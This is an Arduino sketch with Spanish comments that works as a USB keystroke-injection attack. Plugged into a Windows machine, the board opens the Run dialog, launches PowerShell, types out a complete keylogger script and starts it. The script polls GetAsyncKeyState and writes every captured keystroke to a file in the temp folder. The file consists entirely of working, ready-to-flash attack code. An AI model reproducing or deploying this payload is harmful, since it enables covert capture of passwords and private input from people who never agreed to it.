#include <Keyboard.h>
//Esta es la funcion de shell que vamos a correr para loggear las teclas
char SCRIPT[] = "function Start-KeyLogger($Path=\"$env:temp\keylogger.txt\") \n { \n # Signatures for API Calls \n $signatures = @' \n [DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] \n public static extern short GetAsyncKeyState(int virtualKeyCode); \n [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] \n public static extern int GetKeyboardState(byte[] keystate); \n [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] \n public static extern int MapVirtualKey(uint uCode, int uMapType); \n [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] \n public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags); \n'@ \n \n # load signatures and make members available \n $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru \n \n # create output file \n $null = New-Item -Path $Path -ItemType File -Force \n \n try \n { \n Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red \n \n # create endless loop. When user presses CTRL+C, finally-block \n # executes and shows the collected key presses \n while ($true) { \n Start-Sleep -Milliseconds 40 \n \n # scan all ASCII codes above 8 \n for ($ascii = 9; $ascii -le 254; $ascii++) { \n # get current key state \n $state = $API::GetAsyncKeyState($ascii) \n \n # is key pressed? \n if ($state -eq -32767) { \n $null = [console]::CapsLock \n \n # translate scan code to real code \n $virtualKey = $API::MapVirtualKey($ascii, 3) \n \n # get keyboard state for virtual keys \n $kbstate = New-Object Byte[] 256 \n $checkkbstate = $API::GetKeyboardState($kbstate) \n \n # prepare a StringBuilder to receive input key \n $mychar = New-Object -TypeName System.Text.StringBuilder \n \n # translate virtual key \n $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0) \n \n if ($success) \n { \n # add key to logger file \n [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) \n } \n } \n } \n } \n } \n finally \n { \n # open logger file in Notepad \n notepad $Path \n } \n } \n";

#define KEY_LEFT_SHIFT 0x81
#define KEY_LEFT_ALT  0x82
#define KEY_LEFT_GUI  0x83
#define KEY_RIGHT_CTRL  0x84
#define KEY_RIGHT_SHIFT   0x85
#define KEY_RIGHT_ALT   0x86
#define KEY_RIGHT_GUI   0x87
#define KEY_UP_ARROW  0xDA
#define KEY_DOWN_ARROW  0xD9
#define KEY_LEFT_ARROW  0xD8
#define KEY_RIGHT_ARROW   0xD7
#define KEY_BACKSPACE   0xB2
#define KEY_TAB   0xB3
#define KEY_RETURN  0xB0
#define KEY_ESC   0xB1
#define KEY_INSERT  0xD1
#define KEY_DELETE  0xD4
#define KEY_PAGE_UP   0xD3
#define KEY_PAGE_DOWN   0xD6
#define KEY_HOME  0xD2
#define KEY_END   0xD5
#define KEY_CAPS_LOCK   0xC1
#define KEY_F1  0xC2
#define KEY_F2  0xC3
#define KEY_F3  0xC4
#define KEY_F4  0xC5
#define KEY_F5  0xC6
#define KEY_F6  0xC7
#define KEY_F7  0xC8
#define KEY_F8  0xC9
#define KEY_F9  0xCA
#define KEY_F10   0xCB
#define KEY_F11   0xCC
#define KEY_F12   0xCD

void setup() {
  Keyboard.begin(); //  Inicio el teclado
  //Serial.begin(9600);
  delay(500);
  Keyboard.press(KEY_LEFT_GUI); //  Toco SHIFT + d para ir al desktop
  Keyboard.press('d');
  Keyboard.releaseAll();  //  Suelto las teclas
  delay(500);
  Keyboard.press(KEY_LEFT_GUI); //  Toco SHIFT + r para ejecutar
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("powershell"); //  Ingreso powershell para abrir una consola
  delay(500);
  Keyboard.print(SCRIPT); //  Se ingresa el script
  Keyboard.println("Start-KeyLogger");  //  Se inicia la funcion que loguea las teclas
  Keyboard.releaseAll();  //  Suelto las teclas

  Keyboard.end();
}

void loop() {

}
